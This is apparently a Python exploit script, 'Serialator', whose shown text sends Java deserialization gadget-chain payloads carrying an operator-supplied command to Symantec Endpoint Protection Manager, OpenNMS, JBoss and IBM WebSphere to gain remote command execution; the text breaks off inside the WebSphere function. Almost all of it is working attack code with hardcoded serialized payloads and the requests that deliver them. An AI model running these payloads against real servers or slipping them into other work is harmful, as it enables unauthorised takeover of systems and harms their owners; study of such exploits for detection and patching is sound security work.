#! /bin/bash/env python3
#
#  ____            _       _       _             
# / ___|  ___ _ __(_) __ _| | __ _| |_ ___  _ __ 
# \___ \ / _ \ '__| |/ _` | |/ _` | __/ _ \| '__|
#  ___) |  __/ |  | | (_| | | (_| | || (_) | |   
# |____/ \___|_|  |_|\__,_|_|\__,_|\__\___/|_|
#
# By Nikhil Sreekumar (@roo7break)
#

import sys
import base64
import httplib2
import socket
import argparse
import socket
import os
import struct
import ctypes

version = "0.1"
banner = """
  ____            _       _       _             
 / ___|  ___ _ __(_) __ _| | __ _| |_ ___  _ __ 
 \___ \ / _ \ '__| |/ _` | |/ _` | __/ _ \| '__|
  ___) |  __/ |  | | (_| | | (_| | || (_) | |   
 |____/ \___|_|  |_|\__,_|_|\__,_|\__\___/|_|
                    by Nikhil Sreekumar (@roo7break) v %s

""" % version

def hex2raw3(teststr):
    """
    This function takes a string (expecting hexstring) and returns byte string
    """
    # From: HexToByte() at http://code.activestate.com/recipes/510399-byte-to-hex-and-hex-to-byte-string-conversion/
    bytes = []
    teststr = ''.join( teststr.split(" ") )
    for i in range(0, len(teststr), 2):
        bytes.append( chr( int (teststr[i:i+2], 16 ) ) )
    return "".join(bytes)

def symantec_endpoint_attack(HOST, PORT, SSL_On, _cmd):
    # The below code is based on the symantec_endpoint_prot_mgr_2015_6554.nasl script within Nessus
    """
    This function sets up the attack payload for Symantec Endpoint
    """
    
    java_payload = '\xac\xed\x00\x05\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x2e\x41\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x55\xca\xf5\x0f\x15\xcb\x7e\xa5\x02\x00\x02\x4c\x00\x0c\x6d\x65\x6d\x62\x65\x72\x56\x61\x6c\x75\x65\x73\x74\x00\x0f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x4c\x00\x04\x74\x79\x70\x65\x74\x00\x11\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x78\x70\x73\x7d\x00\x00\x00\x01\x00\x0d\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x4d\x61\x70\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x71\x00\x7e\x00\x00\x73\x72\x00\x2a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6d\x61\x70\x2e\x4c\x61\x7a\x79\x4d\x61\x70\x6e\xe5\x94\x82\x9e\x79\x10\x94\x03\x00\x01\x4c\x00\x07\x66\x61\x63\x74\x6f\x72\x79\x74\x00\x2c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x68\x61\x69\x6e\x65\x64\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x30\xc7\x97\xec\x28\x7a\x97\x04\x02\x00\x01\x5b\x00\x0d\x69\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x73\x74\x00\x2d\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x78\x70\x75\x72\x00\x2d\x5b\x4c\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\xbd\x56\x2a\xf1\xd8\x34\x18\x99\x02\x00\x00\x78\x70\x00\x00\x00\x04\x73\x72\x00\x3b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x6f\x6e\x73\x74\x61\x6e\x74\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x58\x76\x90\x11\x41\x02\xb1\x94\x02\x00\x01\x4c\x00\x09\x69\x43\x6f\x6e\x73\x74\x61\x6e\x74\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x78\x70\x76\x72\x00\x25\x63\x6f\x6d\x2e\x73\x79\x67\x61\x74\x65\x2e\x73\x63\x6d\x2e\x75\x74\x69\x6c\x2e\x52\x75\x6e\x43\x6f\x6d\x6d\x61\x6e\x64\x48\x61\x6e\x64\x6c\x65\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x49\x6e\x76\x6f\x6b\x65\x72\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x87\xe8\xff\x6b\x7b\x7c\xce\x38\x02\x00\x03\x5b\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0b\x69\x4d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0b\x69\x50\x61\x72\x61\x6d\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x78\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x02\x74\x00\x0e\x72\x75\x6e\x43\x6f\x6d\x6d\x61\x6e\x64\x4c\x69\x6e\x65\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x78\x70\x00\x00\x00\x01\x76\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x78\x70\x74\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x75\x71\x00\x7e\x00\x1e\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x02\x00\x00\x78\x70\x76\x71\x00\x7e\x00\x1e\x73\x71\x00\x7e\x00\x16\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x02\x70\x75\x71\x00\x7e\x00\x1b\x00\x00\x00\x01\x75\x71\x00\x7e\x00\x20\x00\x00\x00\x03\x74\x00\x07\x63\x6d\x64\x2e\x65\x78\x65\x74\x00\x02\x2f\x63\x74\x00'
    
    cleng = len(_cmd)
    java_payload += chr(cleng) + _cmd
    java_payload += '\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x75\x71\x00\x7e\x00\x1e\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x76\x71\x00\x7e\x00\x1b\x73\x71\x00\x7e\x00\x11\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x78\x70\x00\x00\x00\x01\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x10\x77\x08\x00\x00\x00\x10\x00\x00\x00\x00\x78\x78\x76\x72\x00\x12\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x76\x65\x72\x72\x69\x64\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x78\x70\x71\x00\x7e\x00\x3a'

    fullpayload = """------=_Part_0_992568364.1449677528532
Content-Type: application/binary
Content-Disposition: form-data; name="Content"

%s 

------=_Part_0_992568364.1449677528532--
""" % java_payload

    if SSL_On:
        webservice = httplib2.Http(disable_ssl_certificate_validation=True)
        URL_ADDR = "%s://%s:%s" % ('https',HOST,PORT)
    else:
        webservice = httplib2.Http()
        URL_ADDR = "%s://%s:%s" % ('http',HOST,PORT)
    
    headers = {"User-Agent":"Symantec_RCE_POC",
            "Content-type":"multipart/form-data;",
            "boundary":"----=_Part_0_992568364.1449677528532",
            "Accept":"text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n",
            "Connection":"keep-alive",
            "Content-length":"%d" % len(fullpayload)
        }
    resp, content = webservice.request(URL_ADDR+"/servlet/ConsoleServlet?ActionType=SendStatPing", "POST", body=fullpayload, headers=headers)
    # print provided response.
    print("[i] Response received from target: %s" % resp)

def opennms_attack(HOST, PORT, _cmd):
    # The below code is based on the opennms_java_serialize.nasl script within Nessus
    """
    This function sets up the attack payload for OpenNMS
    """
    clen = len(_cmd)
    d1 = '\x4a\x52\x4d\x49\x00\x02\x4b'
    d2 = '\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x00\x00\x00\x50\xac\xed\x00\x05\x77\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x15\x4d\xc9\xd4\xe6\x3b\xdf\x74\x00\x05\x70\x77\x6e\x65\x64\x73\x7d\x00\x00\x00\x01\x00\x0f\x6a\x61\x76\x61\x2e\x72\x6d\x69\x2e\x52\x65\x6d\x6f\x74\x65\x70\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x70\x78\x70\x73\x72\x00\x32\x73\x75\x6e\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x61\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x2e\x41\x6e\x6e\x6f\x74\x61\x74\x69\x6f\x6e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x55\xca\xf5\x0f\x15\xcb\x7e\xa5\x02\x00\x02\x4c\x00\x0c\x6d\x65\x6d\x62\x65\x72\x56\x61\x6c\x75\x65\x73\x74\x00\x0f\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4d\x61\x70\x3b\x4c\x00\x04\x74\x79\x70\x65\x74\x00\x11\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x70\x78\x70\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x70\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x71\x00\x7e\x00\x00\x73\x71\x00\x7e\x00\x05\x73\x7d\x00\x00\x00\x01\x00\x0d\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x4d\x61\x70\x70\x78\x71\x00\x7e\x00\x02\x73\x71\x00\x7e\x00\x05\x73\x72\x00\x2a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x6d\x61\x70\x2e\x4c\x61\x7a\x79\x4d\x61\x70\x6e\xe5\x94\x82\x9e\x79\x10\x94\x03\x00\x01\x4c\x00\x07\x66\x61\x63\x74\x6f\x72\x79\x74\x00\x2c\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x70\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x68\x61\x69\x6e\x65\x64\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x30\xc7\x97\xec\x28\x7a\x97\x04\x02\x00\x01\x5b\x00\x0d\x69\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x73\x74\x00\x2d\x5b\x4c\x6f\x72\x67\x2f\x61\x70\x61\x63\x68\x65\x2f\x63\x6f\x6d\x6d\x6f\x6e\x73\x2f\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2f\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\x70\x78\x70\x75\x72\x00\x2d\x5b\x4c\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x3b\xbd\x56\x2a\xf1\xd8\x34\x18\x99\x02\x00\x00\x70\x78\x70\x00\x00\x00\x05\x73\x72\x00\x3b\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x43\x6f\x6e\x73\x74\x61\x6e\x74\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x58\x76\x90\x11\x41\x02\xb1\x94\x02\x00\x01\x4c\x00\x09\x69\x43\x6f\x6e\x73\x74\x61\x6e\x74\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x70\x78\x70\x76\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x52\x75\x6e\x74\x69\x6d\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x73\x72\x00\x3a\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x63\x6f\x6d\x6d\x6f\x6e\x73\x2e\x63\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x2e\x66\x75\x6e\x63\x74\x6f\x72\x73\x2e\x49\x6e\x76\x6f\x6b\x65\x72\x54\x72\x61\x6e\x73\x66\x6f\x72\x6d\x65\x72\x87\xe8\xff\x6b\x7b\x7c\xce\x38\x02\x00\x03\x5b\x00\x05\x69\x41\x72\x67\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0b\x69\x4d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x0b\x69\x50\x61\x72\x61\x6d\x54\x79\x70\x65\x73\x74\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x43\x6c\x61\x73\x73\x3b\x70\x78\x70\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x70\x78\x70\x00\x00\x00\x02\x74\x00\x0a\x67\x65\x74\x52\x75\x6e\x74\x69\x6d\x65\x75\x72\x00\x12\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x43\x6c\x61\x73\x73\x3b\xab\x16\xd7\xae\xcb\xcd\x5a\x99\x02\x00\x00\x70\x78\x70\x00\x00\x00\x00\x74\x00\x09\x67\x65\x74\x4d\x65\x74\x68\x6f\x64\x75\x71\x00\x7e\x00\x24\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\xa0\xf0\xa4\x38\x7a\x3b\xb3\x42\x02\x00\x00\x70\x78\x70\x76\x71\x00\x7e\x00\x24\x73\x71\x00\x7e\x00\x1c\x75\x71\x00\x7e\x00\x21\x00\x00\x00\x02\x70\x75\x71\x00\x7e\x00\x21\x00\x00\x00\x00\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x75\x71\x00\x7e\x00\x24\x00\x00\x00\x02\x76\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x76\x71\x00\x7e\x00\x21\x73\x71\x00\x7e\x00\x1c\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x74'
    d2 += '\x00' + chr(clen)
    d2 += _cmd
    d2 += '\x74\x00\x04\x65\x78\x65\x63\x75\x71\x00\x7e\x00\x24\x00\x00\x00\x01\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x17\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75\x65\x70\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00\x70\x78\x70\x00\x00\x00\x01\x73\x71\x00\x7e\x00\x09\x3f\x40\x00\x00\x00\x00\x00\x10\x77\x08\x00\x00\x00\x10\x00\x00\x00\x00\x78\x78\x76\x72\x00\x12\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x76\x65\x72\x72\x69\x64\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x78\x70\x71\x00\x7e\x00\x3f\x78\x71\x00\x7e\x00\x3f'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    print("[i] Sending initial packets to OpenNMS RMI service")
    s.sendall(d1)
    retdata = s.recv(8192)
    if retdata:
        #
        # We have received some data suggesting the OpenNMS RMI Registry has responded.
        # Time to exploit.
        #
        print("[+] OpenNMS RMI service responded. Sending the exploit code...")
        s.sendall(d2)
    else:
        print("[-] Sorry, the RMI service didnt respond. Revert to manual attack.")
        return 0
    
def jboss_attack(HOST, PORT, SSL_On, _cmd):
    # The below code is based on the jboss_java_serialize.nasl script within Nessus 
    """
    This function sets up the attack payload for JBoss
    """
    body_serObj = hex2raw3("ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400")
    
    cleng = len(_cmd)
    body_serObj += chr(cleng) + _cmd
    body_serObj += hex2raw3("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A")
    
    if SSL_On:
        webservice = httplib2.Http(disable_ssl_certificate_validation=True)
        URL_ADDR = "%s://%s:%s" % ('https',HOST,PORT)
    else:
        webservice = httplib2.Http()
        URL_ADDR = "%s://%s:%s" % ('http',HOST,PORT)
    headers = {"User-Agent":"JBoss_RCE_POC",
            "Content-type":"application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",
            "Content-length":"%d" % len(body_serObj)
        }
    resp, content = webservice.request(URL_ADDR+"/invoker/JMXInvokerServlet", "POST", body=body_serObj, headers=headers)
    # print provided response.
    print("[i] Response received from target: %s" % resp)

def websphere_attack(HOST, PORT, SSL_On, _cmd):
    # The below code is based on the websphere_java_serialize.nasl script within Nessus
    """
    This function sets up the attack payload for IBM WebSphere
    """
    serObj3 = hex2raw3("ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400") # Setup initial parts of the payload packet
    cleng = len(_cmd) # Get the length of the payload
    serObj3 += chr(cleng) + _cmd # Convert the length to byte string, prepend to the payload and concatenate with the serialised payload.
    serObj3 += hex2raw3("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A") # Complete the payload packet
    serObjB64_3 = base64.b64encode(serObj3) # Base64 encode the whole payload
    
    body = """<?xml version='1.0' encoding='UTF-8'?>
